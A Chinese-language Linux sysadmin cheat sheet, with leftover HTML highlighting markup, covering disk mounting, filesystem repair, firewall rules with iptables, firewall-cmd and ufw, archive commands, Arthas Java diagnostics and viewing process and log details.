<span class="token builtin class-name">.</span><span class="token comment">#扩展用法---&gt; 包含子目录</span><span class="token comment"># 还需在不同系统验证-&gt;当前目录下文件或目录占用详情（不含子目录和文件）</span><span class="token function">du</span> -sh ./*<span class="token comment">#按照文件夹大小排序</span><span class="token function">du</span> -s ./* <span class="token operator">|</span> <span class="token function">sort</span> -nr<span class="token comment"># 显示磁盘分区上可以使用的磁盘空间</span><span class="token function">df</span> -h<span class="token comment">########### 磁盘挂载 ########</span><span class="token comment">#查看所有磁盘设备</span><span class="token function">fdisk</span> -l<span class="token comment">#查看已经挂载的设备</span><span class="token function">mount</span><span class="token comment">#挂载磁盘到指定目录</span><span class="token function">mkdir</span> /media/windows <span class="token comment">#需要先创建好挂载到的目标目录</span><span class="token function">mount</span> -t ntfs /dev/hda1 /media/windows/ <span class="token comment">#挂载磁盘到指定目录</span><span class="token comment">#卸载挂载的磁盘</span><span class="token function">umount</span> /media/windows<span class="token comment">#查看在使用的进程(用于解决被占用无法卸载,可得到占用进程的pid,使用kill关掉即可)</span><span class="token function">fuser</span> -mv /mnt/data<span class="token comment">#参数说明：</span><span class="token comment">#-k,--kill kill 　　processes accessing the named file</span><span class="token comment">#-m,--mount 　　 show all processes using the named filesystems or block device</span><span class="token comment">#-v,--verbose 　　 verbose output</span><span class="token comment">#注意：</span><span class="token comment">#可以使用 fuser -km /mnt 进行 kill 进程, 可能会结束当前bash进程</span><span class="token comment">#可以使用 kill 命令杀掉查到对应的进程 。</span><span class="token comment">#强制 kill 进程可能会导致数据丢失，请确保数据得到有效备份后，再进行相关操作。</span><span class="token comment">###mount挂载失败出现Structure needs cleaning</span><span class="token comment">#ext4文件系统，使用下面命令修复</span>fsck.ext4 /dev/sda1<span class="token comment">#如果是xfs文件系统，使用下面命令修复</span>xfs_repair -L /dev/sda1<span class="token comment">########mount命令详解</span><span class="token comment">#功能：加载指定的文件系统。</span><span class="token comment">#语法：mount [-afFhnrvVw] [-L] [-o] [-t] [设备名] [加载点]</span><span class="token comment">#用法说明：mount可将指定设备中指定的文件系统加载到Linux目录下（也就是装载点）。</span><span class="token comment">#可将经常使用的设备写入文件/etc/fastab,以使系统在每次启动时自动加载。</span><span class="token comment">#mount加载设备的信息记录在/etc/mtab文件中。使用umount命令卸载设备时，记录将被清除。</span><span class="token comment">###常用参数和选项：</span><span class="token comment">#-a 加载文件/etc/fstab中设置的所有设备。</span><span class="token comment">#-f 不实际加载设备。可与-v等参数同时使用以查看mount的执行过程。</span><span class="token comment">#-F 需与-a参数同时使用。所有在/etc/fstab中设置的设备会被同时加载，可加快执行速度。</span><span class="token comment">#-h 显示在线帮助信息。</span><span class="token comment">#-L 加载文件系统标签为的设备。</span><span class="token comment">#-n 不将加载信息记录在/etc/mtab文件中。</span><span class="token comment">###-o 指定加载文件系统时的选项。有些选项也可在/etc/fstab中使用。这些选项包括：</span><span class="token comment">#async 以非同步的方式执行文件系统的输入输出动作。</span><span class="token comment">#atime 每次存取都更新inode的存取时间，默认设置，取消选项为noatime。</span><span class="token comment">#auto 必须在/etc/fstab文件中指定此选项。执行-a参数时，会加载设置为auto的设备，取消选取为noauto。</span><span class="token comment">#defaults 使用默认的选项。默认选项为rw、suid、dev、exec、anto nouser与async。</span><span class="token comment">#dev 可读文件系统上的字符或块设备，取消选项为nodev。</span><span class="token comment">#exec 可执行二进制文件，取消选项为noexec。</span><span class="token comment">#noatime 每次存取时不更新inode的存取时间。</span><span class="token comment">#noauto 无法使用-a参数来加载。</span><span class="token comment">#nodev 不读文件系统上的字符或块设备。</span><span class="token comment">#noexec 无法执行二进制文件。</span><span class="token comment">#nosuid 关闭set-user-identifier(设置用户ID)与set-group-identifer(设置组ID)设置位。</span><span class="token comment">#nouser 使一位用户无法执行加载操作，默认设置。</span><span class="token comment">#remount 重新加载设备。通常用于改变设备的设置状态。</span><span class="token comment">#ro 以只读模式加载。</span><span class="token comment">#rw 以可读写模式加载。</span><span class="token comment">#suid 启动set-user-identifier(设置用户ID)与set-group-identifer(设置组ID)设置位，取消选项为nosuid。</span><span class="token comment">#sync 以同步方式执行文件系统的输入输出动作。</span><span class="token comment">#user 可以让一般用户加载设备。</span><span class="token comment">###-r 以只读方式加载设备。</span><span class="token comment">###-t 指定设备的文件系统类型。常用的选项说明有：</span><span class="token comment">#minix Linux最早使用的文件系统。</span><span class="token comment">#ext2 Linux目前的常用文件系统。</span><span class="token comment">#msdos MS-DOS 的 FAT。</span><span class="token comment">#vfat Win85/98 的 VFAT。</span><span class="token comment">#nfs 网络文件系统。</span><span class="token comment">#iso9660 CD-ROM光盘的标准文件系统。</span><span class="token comment">#ntfs Windows NT的文件系统。</span><span class="token comment">#hpfs OS/2文件系统。Windows NT 3.51之前版本的文件系统。</span><span class="token comment">#auto 自动检测文件系统。</span><span class="token comment">#-v 执行时显示详细的信息。</span><span class="token comment">#-V 显示版本信息。</span><span class="token comment">#-w 以可读写模式加载设备，默认设置。</span><span class="token comment">###简单用法:</span><span class="token comment">#fat32的分区</span><span class="token function">mount</span> -o <span class="token assign-left variable">codepage</span><span class="token operator">=</span><span class="token number">936</span>,iocharset<span class="token operator">=</span>cp936 /dev/hda7 /mnt/cdrom <span class="token punctuation">(</span>mount -tvfat -o <span class="token assign-left variable">iocharset</span><span class="token operator">=</span>cp936 /dev/hda7 /mnt/cdrom<span class="token punctuation">)</span><span class="token comment">#ntfs的分区</span><span class="token function">mount</span> -o <span class="token assign-left variable">iocharset</span><span class="token operator">=</span>cp936 /dev/hda7 /mnt/cdrom<span class="token comment">#iso文件</span><span class="token function">mount</span> -o loop /abc.iso /mnt/cdrom<span class="token comment">#软盘</span><span class="token function">mount</span> /dev/fd0 /mnt/floppy<span class="token comment">#USB闪存</span><span class="token function">mount</span> /dev/sda1 /mnt/cdrom 说明: /mnt/cdrom 目录必须存在<span class="token comment">#所有/etc/fstab内容</span><span class="token function">mount</span> -a<span class="token comment">#可以指定文件格式”-t 格式”, 格式可以为vfat, ext2, ext3等.</span><span class="token comment">#镜像文件：</span><span class="token function">mount</span> fileName mountPoint -o<span class="token comment">#loop，fileName是镜像文件名(*.iso,*.img)，其它的不用说了，跟上面一样。</span><span class="token comment">#用例：如我有一个a.iso光盘镜像文件，</span><span class="token function">mount</span> a.iso a -o loop <span class="token comment">#这样进入目录a你就能浏览a.iso的内容了，*.img文件的用法一样。</span><span class="token comment">#显示中文方面,如果是fedora core 1 的话，用utf8更好</span><span class="token function">mount</span> -o <span class="token assign-left variable">iocharset</span><span class="token operator">=</span>uft8 /dev/hda1 /mnt/c<span class="token function">mount</span> -o <span class="token assign-left variable">iocharset</span><span class="token operator">=</span>uft8 /dev/sda1 /mnt/usb<span class="token function">mount</span> -t smbfs //ip_addr/share/dir /mnt/smb/share -o<span class="token assign-left variable">iocharset</span><span class="token operator">=</span>uft8,username<span class="token operator">=</span>name, <span class="token assign-left variable">password</span><span class="token operator">=</span>passwd<span class="token comment">#开机就mount上windows下的分区</span><span class="token comment">#自动将windows的d盘挂到/mnt/d上，用gedit打开/etc/fstab</span><span class="token function">vi</span> /etc/fstab<span class="token comment">#加入以下一行</span>/dev/hda5 /mnt/d vfat defaults,codepage<span class="token operator">=</span><span class="token number">936</span>,iocharset<span class="token operator">=</span>cp936 <span class="token number">0</span> <span class="token number">0</span><span class="token comment">#注意，先得手工建立一个/mnt/d目录</span><span class="token function">mkdir</span> /mnt/d<span class="token comment">#这样每次开机后就可以自动挂在分区</span>/dev/sda6 /mnt/E ntfs <span class="token assign-left variable">iocharset</span><span class="token operator">=</span>utf8,umask<span class="token operator">=</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span>/dev/sda7 /mnt/F ntfs <span class="token assign-left variable">iocharset</span><span class="token operator">=</span>utf8,umask<span class="token operator">=</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span>/dev/sda8 /mnt/G ntfs <span class="token assign-left variable">iocharset</span><span class="token operator">=</span>utf8,umask<span class="token operator">=</span><span class="token number">0</span> <span class="token number">0</span> <span class="token number">0</span><span class="token comment"># 开启支持默认挂载ntfs</span><span class="token function">wget</span> -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repoyum update<span class="token punctuation">;</span>yum <span class="token function">install</span> ntfs*<span class="token comment"># 启用rdp远程桌面连接</span>yum groupinstall <span class="token string">"X Window System"</span> <span class="token string">"GNOME Desktop"</span> -ysystemctl set-default graphical.targetyum <span class="token function">install</span> xrdp -ysystemctl start xrdp.service<span class="token comment"># 筛选命令 grep、awk</span><span class="token comment"># grep 'my' 筛选出结果中包含'my'的内容</span>ll <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'my'</span><span class="token comment"># awk 进一步筛选 更多用法baidu.com</span><span class="token comment"># awk '{print $2}' 筛选出第2列的内容</span><span class="token function">ps</span> -ef  <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'app'</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $2}'</span><span class="token comment">###### 防火墙 ########</span><span class="token comment">### 系统级 iptables</span><span class="token comment">#检查设定是否生效(规则优先级是由上到下,上面的会生效后下面的就不生效了,也可理解为上面的生效后覆盖了下面生效的.)</span>iptables -L -n <span class="token operator">|</span> <span class="token function">grep</span> 端口号<span class="token comment">#放行指定8000端口，无需重启服务，直接生效</span><span class="token comment">#-A(Append 添加在原有规则后面)</span>/sbin/iptables -I INPUT -p tcp --dport <span class="token number">8000</span> -j ACCEPT<span class="token comment">#放行区域端口 700-800</span>/sbin/iptables -I INPUT -p tcp --dport <span class="token number">700</span>:800 -j ACCEPTiptables -A RH-Firewall-1-INPUT -m state –state NEW -m tcp -p tcp –dport <span class="token number">700</span>:800 -j ACCEPT<span class="token comment">#保存规则(重启后仍然会丢失数据)</span>iptables-save<span class="token comment">#持久化规则(需要自己安装iptables-persistent)</span><span class="token number">1</span><span class="token punctuation">)</span>安装iptables-persistent<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> iptables-persistent<span class="token number">2</span><span class="token punctuation">)</span>持久化规则<span class="token function">sudo</span> netfilter-persistent save<span class="token function">sudo</span> netfilter-persistent reload<span class="token comment">#重新加载服务</span>systemctl reload iptables.service<span class="token comment">### CentOS中用的多的 firewall-cmd</span><span class="token comment">#查看状态 //running 表示运行</span>firewall-cmd --state<span class="token comment">#查看所有配置</span>firewall-cmd --list-all<span class="token comment">#启用某个服务</span>firewall-cmd --zone<span class="token operator">=</span>public --add-service<span class="token operator">=</span>https <span class="token comment">#临时</span>firewall-cmd --permanent --zone<span class="token operator">=</span>public --add-service<span class="token operator">=</span>https <span class="token comment">#永久</span><span class="token comment">#开启某个端口</span>firewall-cmd --add-port<span class="token operator">=</span><span class="token number">3128</span>/tcp <span class="token comment">#自行加入要开放的 Port</span>firewall-cmd --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">8080</span>-8081/tcp <span class="token comment">#临时</span>firewall-cmd --permanent --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">8080</span>-8081/tcp <span class="token comment">#永久</span><span class="token comment">#删除某个端口</span>firewall-cmd --permanent --zone<span class="token operator">=</span>public --remove-port<span class="token operator">=</span><span class="token number">81</span>/tcp<span class="token comment">#使用命令加载设置 使配置生效</span>firewall-cmd --reload<span class="token comment">#查看开启的端口和服务</span>firewall-cmd --permanent --zone<span class="token operator">=</span>public --list-services <span class="token comment">#服务空格隔开 例如 dhcpv6-client https ss</span>firewall-cmd --permanent --zone<span class="token operator">=</span>public --list-ports <span class="token comment">#端口空格隔开 例如 8080-8081/tcp 8388/tcp 80/tcp</span><span class="token comment">#设置某个ip 访问某个服务，如：ip 192.168.0.4/24 访问 http</span>firewall-cmd --permanent --zone<span class="token operator">=</span>public --add-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span><span class="token number">192.168</span>.0.4/24<span class="token string">" service name="</span>http<span class="token string">" accept"</span><span class="token comment">#删除上面设置的规则</span>firewall-cmd --permanent --zone<span class="token operator">=</span>public --remove-rich-rule<span class="token operator">=</span><span class="token string">"rule family="</span>ipv4<span class="token string">" source address="</span><span class="token number">192.168</span>.0.4/24<span class="token string">" service name="</span>http<span class="token string">" accept"</span><span class="token comment">### Ubuntu中用的多的 ufw</span><span class="token comment">#可检查防火墙的状态：</span>ufw status<span class="token comment">#防火墙版本：</span>ufw version<span class="token comment">#开启/关闭防火墙：</span>ufw <span class="token builtin class-name">enable</span><span class="token operator">|</span>disable<span class="token comment">#开机启动  并设置关闭所有外部对本机的访问，但本机访问外部正常。</span>ufw default deny<span class="token comment">#要重置UFW，只需输入以下命令：</span>ufw reset<span class="token comment">#打开或关闭某个端口，例如：</span><span class="token function">sudo</span> ufw allow smtp　<span class="token comment">#允许所有的外部IP访问本机的25/tcp (smtp)端口</span><span class="token function">sudo</span> ufw allow <span class="token number">22</span>/tcp <span class="token comment">#允许所有的外部IP访问本机的22/tcp (ssh)端口</span><span class="token function">sudo</span> ufw allow <span class="token number">53</span> <span class="token comment">#允许外部访问53端口(tcp/udp)</span><span class="token function">sudo</span> ufw allow from <span class="token number">192.168</span>.1.100 <span class="token comment">#允许此IP访问所有的本机端口</span><span class="token function">sudo</span> ufw allow proto udp <span class="token number">192.168</span>.0.1 port <span class="token number">53</span> to <span class="token number">192.168</span>.0.2 port <span class="token number">53</span><span class="token function">sudo</span> ufw deny smtp <span class="token comment">#禁止外部访问smtp服务</span><span class="token function">sudo</span> ufw delete allow smtp <span class="token comment">#删除上面建立的某条规则</span><span class="token comment">##UFW 使用范例：</span><span class="token comment">#允许 53 端口</span>ufw allow <span class="token number">53</span><span class="token comment">#禁用 53 端口</span>ufw delete allow <span class="token number">53</span><span class="token comment">#允许 80 端口</span>ufw allow <span class="token number">80</span>/tcp<span class="token comment">#禁用 80 端口</span>ufw delete allow <span class="token number">80</span>/tcp<span class="token comment">#允许 smtp 端口</span>ufw allow smtp<span class="token comment">#删除 smtp 端口的许可</span>ufw delete allow smtp<span class="token comment">#允许某特定 IP</span>ufw allow from <span class="token number">192.168</span>.254.254<span class="token comment">#删除上面的规则</span>ufw delete allow from <span class="token number">192.168</span>.254.254<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="压缩-解压缩"><a href="#压缩-解压缩" class="headerlink" title="压缩/解压缩"></a>压缩/解压缩</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 压缩</span><span class="token function">tar</span> -cvf jpg.tar *.jpg //将目录里所有jpg文件打包成tar.jpg<span class="token function">tar</span> -czf jpg.tar.gz *.jpg   //将目录里所有jpg文件打包成jpg.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为jpg.tar.gz<span class="token function">tar</span> -cjf jpg.tar.bz2 *.jpg //将目录里所有jpg文件打包成jpg.tar后，并且将其用bzip2压缩，生成一个bzip2压缩过的包，命名为jpg.tar.bz2<span class="token function">tar</span> -cZf jpg.tar.Z *.jpg   //将目录里所有jpg文件打包成jpg.tar后，并且将其用compress压缩，生成一个umcompress压缩过的包，命名为jpg.tar.Z<span class="token function">rar</span> a jpg.rar *.jpg //rar格式的压缩，需要先下载rar <span class="token keyword">for</span> linux<span class="token comment">###zip压缩</span><span class="token comment"># -q 不显示指令执行过程。</span><span class="token comment"># -r 递归处理，将指定目录下的所有文件和子目录一并处理。</span><span class="token comment"># 将 /home/html/ 这个目录下所有文件和文件夹打包为当前目录下的 html.zip</span><span class="token function">zip</span> -q -r html.zip /home/html<span class="token comment"># 如果在我们在 /home/html 目录下，可以执行以下命令：</span><span class="token function">zip</span> -q -r html.zip *<span class="token function">zip</span> jpg.zip *.jpg //zip格式的压缩，需要先下载zip <span class="token keyword">for</span> linux<span class="token comment"># 解压</span><span class="token function">tar</span> -xvf file.tar //解压 tar包<span class="token function">tar</span> -xzvf file.tar.gz //解压tar.gz<span class="token function">tar</span> -xjvf file.tar.bz2   //解压 tar.bz2<span class="token function">tar</span> -xZvf file.tar.Z   //解压tar.Z<span class="token function">unrar</span> e file.rar //解压rar<span class="token function">unzip</span> file.zip //解压zip<span class="token comment"># -d 从压缩文件内删除指定的文件。</span><span class="token comment"># -v 显示指令执行过程或显示版本信息。</span><span class="token comment"># 从压缩文件 cp.zip 中删除文件 a.c</span><span class="token function">zip</span> -dv cp.zip a.c总结<span class="token comment"># 1、*.tar 用 tar -xvf 解压</span><span class="token comment"># 2、*.gz 用 gzip -d或者gunzip 解压</span><span class="token comment"># 3、*.tar.gz和*.tgz 用 tar -xzf 解压</span><span class="token comment"># 4、*.bz2 用 bzip2 -d或者用bunzip2 解压</span><span class="token comment"># 5、*.tar.bz2用tar -xjf 解压</span><span class="token comment"># 6、*.Z 用 uncompress 解压</span><span class="token comment"># 7、*.tar.Z 用tar -xZf 解压</span><span class="token comment"># 8、*.rar 用 unrar e解压</span><span class="token comment"># 9、*.zip 用 unzip 解压</span><span class="token comment"># 命令参数说明</span><span class="token function">tar</span>-c: 建立压缩档案-x：解压-t：查看内容-r：向压缩归档文件末尾追加文件-u：更新原压缩包中的文件这五个是独立的命令，压缩解压都要用到其中一个，可以和别的命令连用但只能用其中一个。下面的参数是根据需要在压缩或解压档案时可选的。-z：有gzip属性的-j：有bz2属性的-Z：有compress属性的-v：显示所有过程-O：将文件解开到标准输出下面的参数-f是必须的-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。<span class="token comment"># tar -cf all.tar *.jpg</span>这条命令是将所有.jpg的文件打成一个名为all.tar的包。-c是表示产生新的包，-f指定包的文件名。<span class="token comment"># tar -rf all.tar *.gif</span>这条命令是将所有.gif的文件增加到all.tar的包里面去。-r是表示增加文件的意思。<span class="token comment"># tar -uf all.tar logo.gif</span>这条命令是更新原来tar包all.tar中logo.gif文件，-u是表示更新文件的意思。<span class="token comment"># tar -tf all.tar</span>这条命令是列出all.tar包中所有文件，-t是列出文件的意思<span class="token comment"># tar -xf all.tar</span>这条命令是解出all.tar包中所有文件，-t是解开的意思<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Java-诊断工具"><a href="#Java-诊断工具" class="headerlink" title="Java 诊断工具"></a>Java 诊断工具</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看java进程</span>jps<span class="token comment">##Arthas 阿尔萨斯</span><span class="token comment">#Arthas能解决什么问题？</span><span class="token comment">#让我们来看下 Arthas 的官方解释。</span><span class="token comment">#当你遇到以下类似问题而束手无策时，Arthas可以帮助你解决：</span><span class="token comment">#1、这个类从哪个 jar 包加载的？为什么会报各种类相关的 Exception？</span><span class="token comment">#2、我改的代码为什么没有执行到？难道是我没 commit？分支搞错了？</span><span class="token comment">#3、遇到问题无法在线上 debug，难道只能通过加日志再重新发布吗？</span><span class="token comment">#4、线上遇到某个用户的数据处理有问题，但线上同样无法 debug，线下无法重现！</span><span class="token comment">#5、是否有一个全局视角来查看系统的运行状况？</span><span class="token comment">#6、有什么办法可以监控到JVM的实时运行状态？</span><span class="token comment">### 快速安装</span><span class="token comment">#官方推荐使用 arthas-boot 进行安装，非常方便，以下是基于 Linux 系统环境进行演示，一般解决线上问题也是基于 Linux 环境。</span><span class="token comment">## 第一步：下载</span><span class="token comment">#在任何目录下载 arthas-boot 这个包。</span><span class="token function">wget</span> https://alibaba.github.io/arthas/arthas-boot.jar<span class="token comment">## 第一步：下载</span><span class="token comment">#在任何目录下载 arthas-boot 这个包。</span><span class="token function">wget</span> https://alibaba.github.io/arthas/arthas-boot.jar<span class="token comment">## 第三步：选择进程</span><span class="token comment">#运行 arthas-boot 后，控制台会显示所有 Java 进程，选择一个你需要诊断的进程。</span><span class="token comment">#输入序号1，回车，Arthas会附到目标进程上，并输出日志：</span><span class="token comment">#至此，安装、启动完成。</span><span class="token comment">#更多其他安装方式见：https://alibaba.github.io/arthas/install-detail.html</span><span class="token comment">### 实战使用</span><span class="token comment">#启动完成后，当前光标会进入 arthas 的控制台，接受各种操作命令。</span><span class="token comment">## 1.dashboard</span><span class="token comment">#显示当前系统的实时数据面板，按 ctrl+c 即可退出。</span>dashboard<span class="token comment">## 2.thread</span><span class="token comment">#查看当前 JVM 的线程堆栈信息。</span><span class="token comment">#thread id， 显示指定线程的运行堆栈：</span>thread <span class="token number">20</span><span class="token comment">#显示当前最忙的前N个线程并打印堆栈：</span>thread -n <span class="token number">3</span><span class="token comment">## 3.sc</span><span class="token comment">#查看 JVM 已加载的类详细信息。</span>sc -d *Test<span class="token comment">## 4.sm</span><span class="token comment">#查看已加载类的方法信息。</span>sm -d cn.javastack.springbootbestpractice.SpringBootBestPracticeApplication main<span class="token comment">## 5.jad</span><span class="token comment">#反编译指定已加载类的源代码。</span>jad cn.javastack.springbootbestpractice.SpringBootBestPracticeApplication<span class="token comment">## 6.trace</span><span class="token comment">#显示方法内部调用路径，非实时返回的命令并输出方法路径上的总耗时，以及的每个节点上的详细耗时。</span><span class="token comment"># -j：表示跳过 JDK 中的方法路径。</span>trace -j cn.javastack.springbootbestpractice.web.JsonTest getUserInfo<span class="token comment">## 7.monitor</span><span class="token comment">#对某个方法的调用进行定时监控。</span><span class="token comment"># -c 5：表示每5秒统计一次，统计周期，默认值为120秒。</span><span class="token comment"># 监控维度说明：</span><span class="token comment">#     监控项                说明</span><span class="token comment">#     timestamp           时间戳</span><span class="token comment">#     class               类名</span><span class="token comment">#     method             方法名</span><span class="token comment">#     total               调用次数</span><span class="token comment">#     success             成功次数</span><span class="token comment">#     fail               失败次数</span><span class="token comment">#     rt                 平均响应时间</span><span class="token comment">#     fail-rate           失败率</span>monitor cn.javastack.springbootbestpractice.web.JsonTest getUserInfo -c <span class="token number">5</span><span class="token comment">## 8.watch</span><span class="token comment">#观测方法执行数据，能方便的观察到指定方法的调用情况，如：返回值、抛出异常、入参等。</span><span class="token comment">#监控的是一个方法的入参情况，在方法执行前监控：-b，遍历深度：-x 2。</span><span class="token function">watch</span> cn.javastack.springbootbestpractice.web.JsonTest getUserInfo ‘<span class="token punctuation">{</span>params, returnObj<span class="token punctuation">}</span>’ -x <span class="token number">2</span> -b<span class="token comment">## 9.quit/exit</span><span class="token comment">#退出当前 Arthas。</span><span class="token comment">#这个命令仅退出当前连接的客户端，附到目标进程上的 Arthas 会继续运行，端口不会关闭，下次连接时可以直接连接使用。</span><span class="token comment">## 10.shutdown</span><span class="token comment">#关闭 Arthas 服务端，退出所有 Arthas 客户端。</span><span class="token comment">#以上演示了 10 个命令的基本使用，各种命令的使用详情可以在命令带 --help 进行查阅。</span><span class="token comment">### 总结下来，使用 Arthas 可以很方便的诊断一个 Java 应用程序，</span><span class="token comment">#如：系统数据面板、JVM实时运行状态、类加载情况、监控方法执行情况、显示方法执行路径等。</span><span class="token comment">#Arthas这些实用的功能确实可以帮助我们解决一些常见的线上问题，也能独立于应用程序代码，</span><span class="token comment">#但仅局限于在一个 JVM 进程内，如果是分布式系统，Arthas就有点难了。</span><span class="token comment">#更多其他命令请参考：https://alibaba.github.io/arthas/commands.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="查看运行进程所在目录"><a href="#查看运行进程所在目录" class="headerlink" title="查看运行进程所在目录"></a>查看运行进程所在目录</h1><p>在 linux 下查看进程用</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ps <span class="token operator">-</span>ef <span class="token operator">|</span> grep <span class="token constant">XXX</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过 ps 及 top 命令查看进程信息时，只能查到相对路径，查不到的进程的详细信息，如绝对路径等。这时，我们需要通过以下的方法来查看进程的详细信息：<br>Linux 在启动一个进程时，系统会在/proc 下创建一个以 PID 命名的文件夹，在该文件夹下会有我们的进程的信息，其中包括一个名为 exe 的文件即记录了绝对路径，通过 ll 或 ls –l 命令即可查看。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ll <span class="token operator">/</span> proc <span class="token operator">/</span> <span class="token constant">PID</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>cwd 符号链接的是进程运行目录；<br>exe 符号连接就是执行程序的绝对路径；<br>cmdline 就是程序运行时输入的命令行命令；<br>environ 记录了进程运行时的环境变量；<br>fd 目录下是进程打开或使用的文件的符号连接</p><h1 id="Linux-查看文件指定行内容"><a href="#Linux-查看文件指定行内容" class="headerlink" title="Linux 查看文件指定行内容"></a>Linux 查看文件指定行内容</h1><p>1、tail date.log &nbsp; &nbsp; &nbsp; &nbsp; 输出文件末尾的内容，默认 10 行</p><p>tail -20 date.log &nbsp; &nbsp; 输出最后 20 行的内容</p><p>tail -n -20 date.log &nbsp; 输出倒数第 20 行到文件末尾的内容</p><p>tail -n +20 date.log &nbsp; 输出第 20 行到文件末尾的内容</p><p>tail -f date.log &nbsp; &nbsp; &nbsp; 实时监控文件内容增加，默认 10 行。</p><p>2、head date.log &nbsp; &nbsp; &nbsp; 输出文件开头的内容，默认 10 行</p><p>head -15 date.log &nbsp; 输出开头 15 行的内容</p><p>head -n +15 date.log 输出开头到第 15 行的内容</p><p>head -n -15 date.log 输出开头到倒数第 15 行的内容</p><p>3、sed -n “开始行，结束行<strong>p</strong>“ 